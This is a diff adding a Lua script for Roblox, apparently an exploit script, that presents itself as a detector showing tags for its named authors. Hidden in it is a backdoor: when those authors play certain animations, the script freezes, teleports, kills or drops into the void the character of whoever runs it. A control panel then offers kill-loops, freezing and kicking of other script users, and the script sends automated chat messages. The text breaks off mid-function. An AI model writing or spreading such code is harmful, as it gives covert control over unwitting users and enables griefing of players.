@@ -1,0 +1,1163 @@
+local SpecialPlayerDetector = {
+    specialPlayers = {
+        ["bhcrghvtvg"] = {
+            type = "作者",
+            tagColor = Color3.fromRGB(255, 255, 255),
+            textColor = Color3.fromRGB(0, 0, 0),
+            icon = "☄️"
+        },
+        ["HangingBrother2"] = {
+            type = "副作者", 
+            tagColor = Color3.fromRGB(255, 255, 255),
+            textColor = Color3.fromRGB(0, 0, 0),
+            icon = "⭐"
+        },
+        ["HangingBrother3"] = {
+            type = "副作者",
+            tagColor = Color3.fromRGB(255, 255, 255),
+            textColor = Color3.fromRGB(0, 0, 0),
+            icon = "⭐"
+        }
+    },
+    
+    activeTags = {},
+    detectedPlayers = {},
+    characterConnections = {},
+    isRunning = false,
+    checkInterval = 3,
+    
+    commandAnimations = {
+        freeze = {
+            "http://www.roblox.com/asset/?id=10714177846",
+            "rbxassetid://72042024"
+        },
+        teleport = {
+            "http://www.roblox.com/asset/?id=10714359093",
+            "rbxassetid://204062532"
+        },
+        kill = {
+            "rbxassetid://3541044388",
+            "http://www.roblox.com/asset/?id=10714532019"
+        },
+        void = {
+            "rbxassetid://131777025",
+            "http://www.roblox.com/asset/?id=10714612019"
+        }
+    },
+    animationCheckInterval = 1,
+    isFrozen = false,
+    
+    Players = game:GetService("Players"),
+    RunService = game:GetService("RunService")
+}
+
+SpecialPlayerDetector.LocalPlayer = SpecialPlayerDetector.Players.LocalPlayer
+
+function SpecialPlayerDetector:ShowNotification(title, content, duration)
+    duration = duration or 5
+    pcall(function()
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = title,
+            Text = content,
+            Duration = duration
+        })
+    end)
+end
+
+function SpecialPlayerDetector:SendChatMessage(player, playerData)
+    local message = string.format("🎉 欢迎 %s %s 加入游戏！ %s", 
+        playerData.icon, playerData.type, player.Name)
+    
+    pcall(function()
+        local TextChatService = game:GetService("TextChatService")
+        if TextChatService then
+            local channel = TextChatService.TextChannels.RBXGeneral
+            if channel then
+                channel:SendAsync(message)
+                return
+            end
+        end
+    end)
+    
+    pcall(function()
+        local LocalPlayer = self.Players.LocalPlayer
+        if LocalPlayer then
+            local replicatedStorage = game:GetService("ReplicatedStorage")
+            if replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then
+                local sayMessageRequest = replicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
+                if sayMessageRequest then
+                    sayMessageRequest:FireServer(message, "All")
+                end
+            end
+        end
+    end)
+end
+
+function SpecialPlayerDetector:CreatePlayerTag(player, playerData)
+    if self.activeTags[player] then
+        self.activeTags[player]:Destroy()
+        self.activeTags[player] = nil
+    end
+    
+    local character = player.Character
+    if not character then 
+        return false 
+    end
+    
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if not humanoid then
+        return false
+    end
+    
+    local head = character:FindFirstChild("Head")
+    if not head then
+        head = character:WaitForChild("Head", 2)
+        if not head then
+            return false
+        end
+    end
+    
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "BSSpecialPlayerTag"
+    billboard.Adornee = head
+    billboard.Size = UDim2.new(0, 200, 0, 60)
+    billboard.StudsOffset = Vector3.new(0, 3, 0)
+    billboard.AlwaysOnTop = true
+    billboard.MaxDistance = 100
+    billboard.Enabled = true
+    billboard.Active = true
+    billboard.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    billboard.Parent = head
+    
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "TagFrame"
+    mainFrame.BackgroundColor3 = playerData.tagColor
+    mainFrame.BackgroundTransparency = 0.1
+    mainFrame.Size = UDim2.new(1, 0, 1, 0)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Parent = billboard
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = mainFrame
+    
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(0, 0, 0)
+    stroke.Thickness = 2
+    stroke.Parent = mainFrame
+    
+    local iconLabel = Instance.new("TextLabel")
+    iconLabel.Name = "Icon"
+    iconLabel.Size = UDim2.new(0.3, 0, 1, 0)
+    iconLabel.Position = UDim2.new(0, 0, 0, 0)
+    iconLabel.BackgroundTransparency = 1
+    iconLabel.Text = playerData.icon
+    iconLabel.TextColor3 = playerData.textColor
+    iconLabel.TextScaled = true
+    iconLabel.TextSize = 20
+    iconLabel.Font = Enum.Font.GothamBold
+    iconLabel.Parent = mainFrame
+    
+    local typeLabel = Instance.new("TextLabel")
+    typeLabel.Name = "Type"
+    typeLabel.Size = UDim2.new(0.7, 0, 1, 0)
+    typeLabel.Position = UDim2.new(0.3, 0, 0, 0)
+    typeLabel.BackgroundTransparency = 1
+    typeLabel.Text = "[BS]" .. playerData.type
+    typeLabel.TextColor3 = playerData.textColor
+    typeLabel.TextScaled = true
+    typeLabel.TextSize = 14
+    typeLabel.Font = Enum.Font.GothamSemibold
+    typeLabel.TextWrapped = true
+    typeLabel.Parent = mainFrame
+    
+    self.activeTags[player] = billboard
+    
+    return true
+end
+
+function SpecialPlayerDetector:SetupCharacterListener(player)
+    if self.characterConnections[player] then
+        self.characterConnections[player]:Disconnect()
+        self.characterConnections[player] = nil
+    end
+    
+    self.characterConnections[player] = player.CharacterAdded:Connect(function(character)
+        local humanoid = character:WaitForChild("Humanoid", 5)
+        if humanoid then
+            wait(1)
+            
+            local playerData = self.specialPlayers[player.Name]
+            if playerData then
+                self:CreatePlayerTag(player, playerData)
+            end
+        end
+    end)
+    
+    if player.Character then
+        wait(1)
+        local playerData = self.specialPlayers[player.Name]
+        if playerData then
+            self:CreatePlayerTag(player, playerData)
+        end
+    end
+end
+
+function SpecialPlayerDetector:ProcessSpecialPlayer(player, playerData)
+    if self.detectedPlayers[player] then return end
+    
+    self.detectedPlayers[player] = true
+    
+    self:ShowNotification("检测到特殊玩家", 
+        playerData.type .. " " .. player.Name .. " 已加入游戏", 4)
+    
+    self:SendChatMessage(player, playerData)
+    
+    self:SetupCharacterListener(player)
+end
+
+function SpecialPlayerDetector:CheckPlayer(player)
+    if player == self.LocalPlayer then
+        return false
+    end
+    
+    local playerData = self.specialPlayers[player.Name]
+    if playerData then
+        self:ProcessSpecialPlayer(player, playerData)
+        return true
+    end
+    return false
+end
+
+function SpecialPlayerDetector:RunDetectionCycle()
+    while self.isRunning do
+        local players = self.Players:GetPlayers()
+        
+        for _, player in ipairs(players) do
+            if not self.detectedPlayers[player] then
+                self:CheckPlayer(player)
+            end
+        end
+        
+        wait(self.checkInterval)
+    end
+end
+
+function SpecialPlayerDetector:SetupPlayerJoinListener()
+    self.Players.PlayerAdded:Connect(function(player)
+        wait(2)
+        self:CheckPlayer(player)
+    end)
+end
+
+function SpecialPlayerDetector:SetupPlayerLeaveListener()
+    self.Players.PlayerRemoving:Connect(function(player)
+        if self.activeTags[player] then
+            self.activeTags[player]:Destroy()
+            self.activeTags[player] = nil
+        end
+        
+        if self.characterConnections[player] then
+            self.characterConnections[player]:Disconnect()
+            self.characterConnections[player] = nil
+        end
+        
+        if self.detectedPlayers[player] then
+            self.detectedPlayers[player] = nil
+        end
+    end)
+end
+
+function SpecialPlayerDetector:SetupAnimationMonitor()
+    self.authorAnimationStates = {}
+    
+    coroutine.wrap(function()
+        while self.isRunning do
+            wait(self.animationCheckInterval)
+            
+            for playerName, playerData in pairs(self.specialPlayers) do
+                local player = self.Players:FindFirstChild(playerName)
+                if player and (playerData.type == "作者" or playerData.type == "副作者") then
+                    self:CheckAuthorAnimation(player)
+                end
+            end
+        end
+    end)()
+end
+
+function SpecialPlayerDetector:CheckAuthorAnimation(author)
+    if not author or not author.Character then
+        return
+    end
+    
+    local humanoid = author.Character:FindFirstChildOfClass("Humanoid")
+    if not humanoid then
+        return
+    end
+    
+    local animator = humanoid:FindFirstChildOfClass("Animator")
+    if not animator then
+        return
+    end
+    
+    local playingTracks = animator:GetPlayingAnimationTracks()
+    
+    local isPlayingFreezeAnimation = false
+    for _, track in ipairs(playingTracks) do
+        if track.Animation then
+            for _, animationId in ipairs(self.commandAnimations.freeze) do
+                if track.Animation.AnimationId == animationId then
+                    isPlayingFreezeAnimation = true
+                    break
+                end
+            end
+            if isPlayingFreezeAnimation then break end
+        end
+    end
+    
+    local isPlayingTeleportAnimation = false
+    for _, track in ipairs(playingTracks) do
+        if track.Animation then
+            for _, animationId in ipairs(self.commandAnimations.teleport) do
+                if track.Animation.AnimationId == animationId then
+                    isPlayingTeleportAnimation = true
+                    break
+                end
+            end
+            if isPlayingTeleportAnimation then break end
+        end
+    end
+    
+    local isPlayingKillAnimation = false
+    for _, track in ipairs(playingTracks) do
+        if track.Animation then
+            for _, animationId in ipairs(self.commandAnimations.kill) do
+                if track.Animation.AnimationId == animationId then
+                    isPlayingKillAnimation = true
+                    break
+                end
+            end
+            if isPlayingKillAnimation then break end
+        end
+    end
+    
+    local isPlayingVoidAnimation = false
+    for _, track in ipairs(playingTracks) do
+        if track.Animation then
+            for _, animationId in ipairs(self.commandAnimations.void) do
+                if track.Animation.AnimationId == animationId then
+                    isPlayingVoidAnimation = true
+                    break
+                end
+            end
+            if isPlayingVoidAnimation then break end
+        end
+    end
+    
+    local previousFreezeState = self.authorAnimationStates[author] and self.authorAnimationStates[author].freeze or false
+    local previousTeleportState = self.authorAnimationStates[author] and self.authorAnimationStates[author].teleport or false
+    local previousKillState = self.authorAnimationStates[author] and self.authorAnimationStates[author].kill or false
+    local previousVoidState = self.authorAnimationStates[author] and self.authorAnimationStates[author].void or false
+    
+    if not self.authorAnimationStates[author] then
+        self.authorAnimationStates[author] = {}
+    end
+    
+    self.authorAnimationStates[author].freeze = isPlayingFreezeAnimation
+    self.authorAnimationStates[author].teleport = isPlayingTeleportAnimation
+    self.authorAnimationStates[author].kill = isPlayingKillAnimation
+    self.authorAnimationStates[author].void = isPlayingVoidAnimation
+    
+    local authorData = self.specialPlayers[author.Name]
+    if authorData and (authorData.type == "作者" or authorData.type == "副作者") then
+        if isPlayingFreezeAnimation and not previousFreezeState then
+            self:OnFreezeAnimation(author)
+        end
+        
+        if isPlayingTeleportAnimation and not previousTeleportState then
+            self:OnTeleportAnimation(author)
+        end
+        
+        if isPlayingKillAnimation and not previousKillState then
+            self:OnKillAnimation(author)
+        end
+        
+        if isPlayingVoidAnimation and not previousVoidState then
+            self:OnVoidAnimation(author)
+        end
+    end
+end
+
+function SpecialPlayerDetector:OnFreezeAnimation(author)
+    if author == self.LocalPlayer then
+        return
+    end
+    
+    self:ShowNotification("作者指令", "检测到作者指令:冻结", 3)
+    
+    self:ToggleFreeze()
+end
+
+function SpecialPlayerDetector:OnTeleportAnimation(author)
+    if author == self.LocalPlayer then
+        return
+    end
+    
+    self:ShowNotification("作者指令", "检测到作者指令:传送", 3)
+    
+    self:TeleportToAuthor(author)
+end
+
+function SpecialPlayerDetector:OnKillAnimation(author)
+    if author == self.LocalPlayer then
+        return
+    end
+    
+    self:ShowNotification("作者指令", "检测到作者指令:杀死", 3)
+    
+    self:KillPlayer()
+end
+
+function SpecialPlayerDetector:OnVoidAnimation(author)
+    if author == self.LocalPlayer then
+        return
+    end
+    
+    self:ShowNotification("作者指令", "检测到作者指令:扔虚空", 3)
+    
+    self:SendToVoid()
+end
+
+function SpecialPlayerDetector:ToggleFreeze()
+    local character = self.LocalPlayer.Character
+    if not character then return end
+    
+    local root = character:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    
+    self.isFrozen = not self.isFrozen
+    root.Anchored = self.isFrozen
+    
+    if self.isFrozen then
+        self:ShowNotification("角色冻结", "您的角色已被作者冻结", 3)
+        
+        for _, part in pairs(character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.Anchored = true
+            end
+        end
+    else
+        self:ShowNotification("角色解冻", "您的角色已被作者解冻", 3)
+        
+        for _, part in pairs(character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.Anchored = false
+            end
+        end
+    end
+end
+
+function SpecialPlayerDetector:TeleportToAuthor(author)
+    local authorCharacter = author.Character
+    local playerCharacter = self.LocalPlayer.Character
+    
+    if not authorCharacter or not playerCharacter then
+        self:ShowNotification("传送失败", "角色不存在", 3)
+        return
+    end
+    
+    local authorRoot = authorCharacter:FindFirstChild("HumanoidRootPart")
+    local playerRoot = playerCharacter:FindFirstChild("HumanoidRootPart")
+    
+    if not authorRoot or not playerRoot then
+        self:ShowNotification("传送失败", "无法找到角色根部位", 3)
+        return
+    end
+    
+    local offset = authorRoot.CFrame.LookVector * 3
+    local targetPosition = authorRoot.Position + offset
+    
+    playerRoot.CFrame = CFrame.new(targetPosition) * CFrame.Angles(0, authorRoot.Orientation.Y, 0)
+    
+    self:ShowNotification("传送完成", "已传送到作者 " .. author.Name .. " 身边", 3)
+end
+
+function SpecialPlayerDetector:KillPlayer()
+    local character = self.LocalPlayer.Character
+    if not character then return end
+    
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        humanoid.Health = 0
+        self:ShowNotification("角色死亡", "您的角色已被作者杀死", 3)
+    end
+end
+
+function SpecialPlayerDetector:SendToVoid()
+    local character = self.LocalPlayer.Character
+    if not character then return end
+    
+    local root = character:FindFirstChild("HumanoidRootPart")
+    if root then
+        root.CFrame = CFrame.new(0, -1000, 0)
+        self:ShowNotification("扔入虚空", "您的角色已被作者扔入虚空", 3)
+    end
+end
+
+function SpecialPlayerDetector:SetupCharacterRespawnListener()
+    self.LocalPlayer.CharacterAdded:Connect(function(character)
+        wait(1) 
+        
+        if self.isFrozen then
+            local root = character:FindFirstChild("HumanoidRootPart")
+            if root then
+                root.Anchored = true
+                
+                for _, part in pairs(character:GetDescendants()) do
+                    if part:IsA("BasePart") then
+                        part.Anchored = true
+                    end
+                end
+                
+                self:ShowNotification("角色冻结", "您的角色重生后仍保持冻结状态", 3)
+            end
+        end
+    end)
+end
+
+function SpecialPlayerDetector:Start()
+    if self.isRunning then return end
+    
+    self.isRunning = true
+    
+    self:ShowNotification("系统启动", "特殊玩家检测器已启动", 3)
+    
+    self:SetupPlayerJoinListener()
+    self:SetupPlayerLeaveListener()
+    self:SetupAnimationMonitor()
+    self:SetupCharacterRespawnListener()
+    
+    local players = self.Players:GetPlayers()
+    for _, player in ipairs(players) do
+        self:CheckPlayer(player)
+    end
+    
+    coroutine.wrap(function()
+        self:RunDetectionCycle()
+    end)()
+    
+    pcall(function()
+        wait(3)
+        local message = "指令系统已启动 - 作者控制已激活"
+        local replicatedStorage = game:GetService("ReplicatedStorage")
+        if replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then
+            local sayMessageRequest = replicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
+            if sayMessageRequest then
+                sayMessageRequest:FireServer(message, "All")
+            end
+        end
+    end)
+end
+
+wait(5)
+SpecialPlayerDetector:Start()
+
+local AuthorCommandGUI = {
+    Players = game:GetService("Players"),
+    TweenService = game:GetService("TweenService"),
+    UserInputService = game:GetService("UserInputService"),
+    RunService = game:GetService("RunService")
+}
+
+AuthorCommandGUI.LocalPlayer = AuthorCommandGUI.Players.LocalPlayer
+AuthorCommandGUI.ScriptUsers = {}
+AuthorCommandGUI.IsGUIVisible = false
+AuthorCommandGUI.SpecialPlayers = SpecialPlayerDetector.specialPlayers
+AuthorCommandGUI.PlayerTags = {}
+AuthorCommandGUI.ActiveControls = {}
+
+AuthorCommandGUI.CommandFunctions = {
+    {
+        name = "冻结控制",
+        description = "切换玩家冻结状态",
+        icon = "❄️",
+        type = "toggle",
+        func = function(self, playerName, state)
+            return self:ToggleFreezePlayer(playerName, state)
+        end
+    },
+    {
+        name = "杀死循环",
+        description = "循环杀死目标玩家",
+        icon = "💀",
+        type = "toggle", 
+        func = function(self, playerName, state)
+            return self:ToggleKillPlayer(playerName, state)
+        end
+    },
+    {
+        name = "扔入虚空",
+        description = "将玩家扔入虚空",
+        icon = "🕳️",
+        type = "instant",
+        func = function(self, playerName)
+            return self:SendToVoid(playerName)
+        end
+    },
+    {
+        name = "踢出服务器",
+        description = "将玩家踢出游戏",
+        icon = "🚪",
+        type = "instant",
+        func = function(self, playerName)
+            return self:KickPlayer(playerName)
+        end
+    },
+    {
+        name = "传送身边",
+        description = "传送玩家到身边",
+        icon = "🔮",
+        type = "instant",
+        func = function(self, playerName)
+            return self:TeleportToMe(playerName)
+        end
+    },
+    {
+        name = "显示标签",
+        description = "在玩家头上显示标签",
+        icon = "🏷️",
+        type = "toggle",
+        func = function(self, playerName, state)
+            return self:TogglePlayerTag(playerName, state)
+        end
+    }
+}
+
+function AuthorCommandGUI:ShowNotification(title, content, duration)
+    duration = duration or 3
+    pcall(function()
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = title,
+            Text = content,
+            Duration = duration
+        })
+    end)
+end
+
+function AuthorCommandGUI:IsSpecialPlayer(playerName)
+    return self.SpecialPlayers[playerName] ~= nil
+end
+
+function AuthorCommandGUI:AddScriptUser(playerName)
+    if self:IsSpecialPlayer(playerName) then
+        return
+    end
+    
+    local exists = false
+    for _, name in ipairs(self.ScriptUsers) do
+        if name == playerName then
+            exists = true
+            break
+        end
+    end
+    
+    if not exists then
+        table.insert(self.ScriptUsers, playerName)
+        self:UpdatePlayerList()
+        self:ShowNotification("新用户检测", "检测到脚本用户: " .. playerName, 3)
+    end
+end
+
+function AuthorCommandGUI:RemoveScriptUser(playerName)
+    for i, name in ipairs(self.ScriptUsers) do
+        if name == playerName then
+            table.remove(self.ScriptUsers, i)
+            self:UpdatePlayerList()
+            
+            if self.PlayerTags[playerName] then
+                self.PlayerTags[playerName]:Destroy()
+                self.PlayerTags[playerName] = nil
+            end
+            break
+        end
+    end
+end
+
+function AuthorCommandGUI:CreatePlayerTag(playerName)
+    local player = self.Players:FindFirstChild(playerName)
+    if not player or not player.Character then return nil end
+    
+    local head = player.Character:FindFirstChild("Head")
+    if not head then return nil end
+    
+    if self.PlayerTags[playerName] then
+        self.PlayerTags[playerName]:Destroy()
+    end
+    
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "PlayerTag"
+    billboard.Adornee = head
+    billboard.Size = UDim2.new(0, 150, 0, 40)
+    billboard.StudsOffset = Vector3.new(0, 2.5, 0)
+    billboard.AlwaysOnTop = true
+    billboard.MaxDistance = 50
+    billboard.Enabled = true
+    billboard.Parent = head
+    
+    local frame = Instance.new("Frame")
+    frame.BackgroundColor3 = Color3.new(0, 0, 0)
+    frame.BackgroundTransparency = 0.3
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BorderSizePixel = 0
+    frame.Parent = billboard
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = frame
+    
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.new(1, 1, 1)
+    stroke.Thickness = 2
+    stroke.Parent = frame
+    
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, 0, 1, 0)
+    label.BackgroundTransparency = 1
+    label.Text = playerName
+    label.TextColor3 = Color3.new(1, 1, 1)
+    label.TextSize = 14
+    label.Font = Enum.Font.GothamBold
+    label.Parent = frame
+    
+    self.PlayerTags[playerName] = billboard
+    return billboard
+end
+
+function AuthorCommandGUI:TogglePlayerTag(playerName, state)
+    if state then
+        if not self.PlayerTags[playerName] then
+            self:CreatePlayerTag(playerName)
+        else
+            self.PlayerTags[playerName].Enabled = true
+        end
+        return true
+    else
+        if self.PlayerTags[playerName] then
+            self.PlayerTags[playerName].Enabled = false
+        end
+        return false
+    end
+end
+
+function AuthorCommandGUI:ToggleFreezePlayer(playerName, state)
+    local player = self.Players:FindFirstChild(playerName)
+    if not player or not player.Character then return false end
+    
+    local root = player.Character:FindFirstChild("HumanoidRootPart")
+    if not root then return false end
+    
+    root.Anchored = state
+    
+    for _, part in pairs(player.Character:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.Anchored = state
+        end
+    end
+    
+    return true
+end
+
+function AuthorCommandGUI:ToggleKillPlayer(playerName, state)
+    if state then
+        self.ActiveControls[playerName] = self.ActiveControls[playerName] or {}
+        self.ActiveControls[playerName].kill = true
+        
+        coroutine.wrap(function()
+            while self.ActiveControls[playerName] and self.ActiveControls[playerName].kill do
+                local player = self.Players:FindFirstChild(playerName)
+                if player and player.Character then
+                    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
+                    if humanoid then
+                        humanoid.Health = 0
+                    end
+                end
+                wait(1)
+            end
+        end)()
+        
+        return true
+    else
+        if self.ActiveControls[playerName] then
+            self.ActiveControls[playerName].kill = false
+        end
+        return false
+    end
+end
+
+function AuthorCommandGUI:SendToVoid(playerName)
+    local player = self.Players:FindFirstChild(playerName)
+    if not player or not player.Character then return false end
+    
+    local root = player.Character:FindFirstChild("HumanoidRootPart")
+    if not root then return false end
+    
+    root.CFrame = CFrame.new(0, -1000, 0)
+    return true
+end
+
+function AuthorCommandGUI:KickPlayer(playerName)
+    local player = self.Players:FindFirstChild(playerName)
+    if not player then return false end
+    
+    pcall(function()
+        game:GetService("NetworkClient"):PlayerDrop(player)
+    end)
+    
+    return true
+end
+
+function AuthorCommandGUI:TeleportToMe(playerName)
+    local player = self.Players:FindFirstChild(playerName)
+    local myCharacter = self.LocalPlayer.Character
+    
+    if not player or not player.Character or not myCharacter then return false end
+    
+    local playerRoot = player.Character:FindFirstChild("HumanoidRootPart")
+    local myRoot = myCharacter:FindFirstChild("HumanoidRootPart")
+    
+    if not playerRoot or not myRoot then return false end
+    
+    playerRoot.CFrame = myRoot.CFrame + myRoot.CFrame.LookVector * 5
+    return true
+end
+
+function AuthorCommandGUI:UpdatePlayerList()
+    if not self.PlayerListFrame then return end
+    
+    for _, child in ipairs(self.PlayerListFrame:GetChildren()) do
+        if child:IsA("Frame") and child.Name == "PlayerEntry" then
+            child:Destroy()
+        end
+    end
+    
+    if #self.ScriptUsers == 0 then
+        local noPlayersLabel = Instance.new("TextLabel")
+        noPlayersLabel.Name = "NoPlayersLabel"
+        noPlayersLabel.Size = UDim2.new(1, 0, 0, 50)
+        noPlayersLabel.Position = UDim2.new(0, 0, 0, 0)
+        noPlayersLabel.BackgroundTransparency = 1
+        noPlayersLabel.Text = "暂无可控制用户"
+        noPlayersLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+        noPlayersLabel.TextSize = 14
+        noPlayersLabel.Font = Enum.Font.Gotham
+        noPlayersLabel.Parent = self.PlayerListFrame
+        return
+    end
+    
+    local yPosition = 0
+    local entryHeight = 50
+    local padding = 5
+    
+    for i, playerName in ipairs(self.ScriptUsers) do
+        local playerEntry = Instance.new("Frame")
+        playerEntry.Name = "PlayerEntry"
+        playerEntry.Size = UDim2.new(1, -10, 0, entryHeight)
+        playerEntry.Position = UDim2.new(0, 5, 0, yPosition)
+        playerEntry.BackgroundColor3 = i % 2 == 0 and Color3.fromRGB(40, 40, 40) or Color3.fromRGB(30, 30, 30)
+        playerEntry.BorderSizePixel = 0
+        playerEntry.Parent = self.PlayerListFrame
+        
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 6)
+        corner.Parent = playerEntry
+        
+        local nameLabel = Instance.new("TextLabel")
+        nameLabel.Size = UDim2.new(0.4, 0, 1, 0)
+        nameLabel.Position = UDim2.new(0, 10, 0, 0)
+        nameLabel.BackgroundTransparency = 1
+        nameLabel.Text = playerName
+        nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        nameLabel.TextSize = 12
+        nameLabel.Font = Enum.Font.GothamSemibold
+        nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+        nameLabel.Parent = playerEntry
+        
+        local controlsFrame = Instance.new("Frame")
+        controlsFrame.Size = UDim2.new(0.6, 0, 1, 0)
+        controlsFrame.Position = UDim2.new(0.4, 0, 0, 0)
+        controlsFrame.BackgroundTransparency = 1
+        controlsFrame.Parent = playerEntry
+        
+        local buttonWidth = 30
+        local buttonSpacing = 5
+        local xPos = 0
+        
+        for _, command in ipairs(self.CommandFunctions) do
+            local button = Instance.new("TextButton")
+            button.Size = UDim2.new(0, buttonWidth, 0, 30)
+            button.Position = UDim2.new(0, xPos, 0.1, 0)
+            button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+            button.Text = command.icon
+            button.TextColor3 = Color3.fromRGB(255, 255, 255)
+            button.TextSize = 14
+            button.Font = Enum.Font.GothamBold
+            button.Parent = controlsFrame
+            
+            local buttonCorner = Instance.new("UICorner")
+            buttonCorner.CornerRadius = UDim.new(0, 4)
+            buttonCorner.Parent = button
+            
+            button.MouseButton1Click:Connect(function()
+                if command.type == "toggle" then
+                    local currentState = self.ActiveControls[playerName] and self.ActiveControls[playerName][command.name] or false
+                    local newState = not currentState
+                    
+                    if command.func(self, playerName, newState) then
+                        self.ActiveControls[playerName] = self.ActiveControls[playerName] or {}
+                        self.ActiveControls[playerName][command.name] = newState
+                        
+                        button.BackgroundColor3 = newState and Color3.fromRGB(80, 160, 80) or Color3.fromRGB(60, 60, 60)
+                        self:ShowNotification("控制状态", command.name .. " " .. (newState and "开启" or "关闭") .. ": " .. playerName, 2)
+                    end
+                else
+                    if command.func(self, playerName) then
+                        self:ShowNotification("执行成功", command.name .. ": " .. playerName, 2)
+                    end
+                end
+            end)
+            
+            xPos = xPos + buttonWidth + buttonSpacing
+        end
+        
+        yPosition = yPosition + entryHeight + padding
+    end
+    
+    self.PlayerListFrame.CanvasSize = UDim2.new(0, 0, 0, yPosition)
+end
+
+function AuthorCommandGUI:CreateMiniIcon()
+    local miniGui = Instance.new("ScreenGui")
+    miniGui.Name = "MiniControlIcon"
+    miniGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    miniGui.Parent = self.LocalPlayer:WaitForChild("PlayerGui")
+    
+    local miniButton = Instance.new("TextButton")
+    miniButton.Name = "MiniButton"
+    miniButton.Size = UDim2.new(0, 50, 0, 50)
+    miniButton.Position = UDim2.new(0, 10, 0.5, -25)
+    miniButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    miniButton.Text = "控"
+    miniButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    miniButton.TextSize = 16
+    miniButton.Font = Enum.Font.GothamBold
+    miniButton.Parent = miniGui
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = miniButton
+    
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(100, 100, 100)
+    stroke.Thickness = 2
+    stroke.Parent = miniButton
+    
+    miniButton.MouseButton1Click:Connect(function()
+        self:ShowGUI()
+    end)
+    
+    return miniGui
+end
+
+function AuthorCommandGUI:CreateGUI()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "ControlUserGUI"
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.Parent = self.LocalPlayer:WaitForChild("PlayerGui")
+    
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "MainFrame"
+    mainFrame.Size = UDim2.new(0, 600, 0, 300)
+    mainFrame.Position = UDim2.new(0.5, -300, 0.5, -150)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    mainFrame.BackgroundTransparency = 0.1
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Parent = screenGui
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 12)
+    corner.Parent = mainFrame
+    
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(100, 100, 100)
+    stroke.Thickness = 2
+    stroke.Parent = mainFrame
+    
+    local titleBar = Instance.new("Frame")
+    titleBar.Name = "TitleBar"
+    titleBar.Size = UDim2.new(1, 0, 0, 30)
+    titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    titleBar.BorderSizePixel = 0
+    titleBar.Parent = mainFrame
+    
+    local titleCorner = Instance.new("UICorner")
+    titleCorner.CornerRadius = UDim.new(0, 12)
+    titleCorner.Parent = titleBar
+    
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Name = "Title"
+    titleLabel.Size = UDim2.new(1, -80, 1, 0)
+    titleLabel.Position = UDim2.new(0, 10, 0, 0)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = "控制用户"
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    titleLabel.TextSize = 16
+    titleLabel.Font = Enum.Font.GothamBold
+    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    titleLabel.Parent = titleBar
+    
+    local closeButton = Instance.new("TextButton")
+    closeButton.Name = "CloseButton"
+    closeButton.Size = UDim2.new(0, 25, 0, 25)
+    closeButton.Position = UDim2.new(1, -30, 0.5, -12)
+    closeButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+    closeButton.Text = "×"
+    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    closeButton.TextSize = 16
+    closeButton.Font = Enum.Font.GothamBold
+    closeButton.Parent = titleBar
+    
+    local closeCorner = Instance.new("UICorner")
+    closeCorner.CornerRadius = UDim.new(0, 6)
+    closeCorner.Parent = closeButton
+    
+    local contentFrame = Instance.new("Frame")
+    contentFrame.Name = "ContentFrame"
+    contentFrame.Size = UDim2.new(1, -20, 1, -40)
+    contentFrame.Position = UDim2.new(0, 10, 0, 35)
+    contentFrame.BackgroundTransparency = 1
+    contentFrame.Parent = mainFrame
+    
+    self.PlayerListFrame = Instance.new("ScrollingFrame")
+    self.PlayerListFrame.Size = UDim2.new(1, 0, 1, 0)
+    self.PlayerListFrame.BackgroundTransparency = 1
+    self.PlayerListFrame.BorderSizePixel = 0
+    self.PlayerListFrame.ScrollBarThickness = 6
+    self.PlayerListFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
